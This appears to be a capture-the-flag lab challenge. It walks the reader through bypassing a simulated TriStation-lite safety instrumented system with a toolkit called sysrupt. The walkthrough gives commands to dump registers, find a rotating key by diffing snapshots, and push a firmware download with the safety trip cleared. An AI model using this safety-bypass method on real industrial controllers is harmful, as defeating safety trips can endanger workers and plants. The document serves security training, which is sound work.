# Challenge 2 — Safety Instrumented Bypass

**Protocol:** TriStation-lite · **Port:** 1502/tcp · **Toolkit module:** `tristation`

---

## The Story

The safety system has a download/key mechanism gating firmware changes. Somewhere in its
register space a key value rotates — find it, pair it with the current firmware value, and get
a download through with the trip condition cleared.

## What You Know

- Target is reachable on `10.0.1.1:1502`.
- `tristation dump <start> <count>` reads a block of registers. **This build caps `count` at 32**
  — if you ask for more you'll get `error: count must be 1..32`, so split wide ranges into
  multiple calls.
- Repeated connections in quick succession can get reset (`Connection reset by peer`) — pace your
  calls if you see that.

---

## Step 1: Take a baseline snapshot

<details>
<summary>Hint</summary>

You're hunting for a register that changes on its own between two snapshots — a rolling key.
One dump isn't enough; you need two, spaced apart.
</details>

<details>
<summary>Show command</summary>

```bash
./bin/sysrupt status
./bin/sysrupt tristation dump 6 32 > pass1a.txt
./bin/sysrupt tristation dump 38 26 > pass1b.txt
```

If you hit a connection reset, wait a second and retry — don't fire both ranges back-to-back
with no gap.
</details>

## Step 2: Take a second snapshot and diff

<details>
<summary>Hint</summary>

A few seconds is enough. Compare old vs new line by line.
</details>

<details>
<summary>Show command</summary>

```bash
sleep 3
./bin/sysrupt tristation dump 6 32 > pass2a.txt
./bin/sysrupt tristation dump 38 26 > pass2b.txt
diff pass1a.txt pass2a.txt
diff pass1b.txt pass2b.txt
```

Whichever register(s) show up in the diff are your key candidates.
</details>

## Step 3: Read the firmware and checksum registers

<details>
<summary>Hint</summary>

The download command wants a firmware value alongside the key. Find it the same way — read,
don't assume an address.
</details>

<details>
<summary>Show command</summary>

```bash
./bin/sysrupt tristation write 1 1          # open the download window
./bin/sysrupt tristation read 2             # candidate firmware register
```
</details>

## Step 4: Try the download against each key candidate

<details>
<summary>Hint</summary>

The download window may not stay open long. If one candidate fails, you may need to reopen the
window (Step 3) before trying the next.
</details>

<details>
<summary>Show command</summary>

```bash
./bin/sysrupt tristation write 1 1
./bin/sysrupt tristation read <KEY_CANDIDATE_REG>
./bin/sysrupt tristation download --fw <FW_VALUE> --key <KEY_VALUE> --trip 0
```

Repeat per candidate until one returns success.
</details>

## What You Learned

- How to work around this build's 32-register dump cap by splitting a range into multiple calls.
- How to find a rolling/rotating register by diffing two time-separated snapshots instead of
  guessing an address.
- That a download/key window may be time-limited, so failed attempts may need to be retried from
  the top, not resumed mid-sequence.
